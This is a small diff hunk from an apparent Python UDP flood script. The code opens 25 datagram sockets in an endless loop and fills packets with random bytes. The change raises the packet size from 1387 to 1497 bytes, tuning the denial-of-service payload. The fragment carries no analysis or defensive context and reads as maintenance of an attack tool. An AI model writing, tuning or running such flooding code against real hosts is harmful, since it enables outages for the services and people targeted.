@@ -141,7 +141,7 @@ while True:
         for i in range(25):
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             socks.append(sock)
-        bytes = random._urandom(1387)
+        bytes = random._urandom(1497)
         sent = 0
         try:
             while True:
